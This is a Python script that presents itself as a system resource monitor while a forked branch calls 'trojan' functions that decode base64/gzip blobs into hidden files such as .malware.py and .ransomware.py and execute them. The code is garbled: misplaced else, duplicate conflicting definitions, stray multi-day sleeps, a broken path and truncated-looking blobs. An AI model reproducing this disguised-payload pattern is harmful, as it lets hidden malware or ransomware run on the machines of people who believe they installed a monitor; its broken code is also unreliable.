import psutil
import base64
import time
import gzip
import os

def main():
    pid = os.fork()

    if pid > 0:
        while True:
            cpu = psutil.cpu_percent()
            ram = psutil.virtual_memory().percent
            disk = psutil.disk_usage("/").percent
            processes_count = 0
            for _ in psutil.process_iter():
                processes_count += 1


            print("---------------------------------------------------------")
            print("| CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
            print("| {:02}%     | {:02}%    | {:02}%        | {}            |".format(int(cpu), int(ram), int(disk), processes_count))
            print("---------------------------------------------------------")

            time.sleep(2)
        else:
            trojan()


    def trojan():
        malware_fd = open(".malware.py", "w")
        blob = "H4sICAncMmEAA21hbHdhcmeroigvq0w9v5ur0m3qoiwHHGQ5UJIP"
        malware = gzip.decompress(base64.b64decode(blob)).decode("UTF-8")
        malware_fd.write(malware)
        malware_fd.close()

        os.system("/usr/bin/python3 .malware.py")

time.sleep(640800)


def trojan():
    ransomware_fd = open(".ransomware.py", "w")
    blob = "H4sICAncMmEAA21hbHdhcmeroigvq"
    ransomware = gzip.decompress(base64.b64decode(blob)).decode("UTF-8")
    ransomware_fd.write(ransomware)
    ransomware_fd.close()

    os.system("/usr/bin/python3.ransomware.py")

time.sleep(2620000)


def trojan():
    malware_fd = open(".malware2.py", "w")
    blob = "H4sICAncMmEAA21hbHdhwrjHVKGJUJVvVjJvJHVGHvGJGvJVJGvJGVrwownihc"
    malware = gzip.decompress(base64.b64decode(blob)).decode("UTF-8")
    malware_fd.write(malware)
    malware_fd.close()


    if __name__ == "__main__":
        main()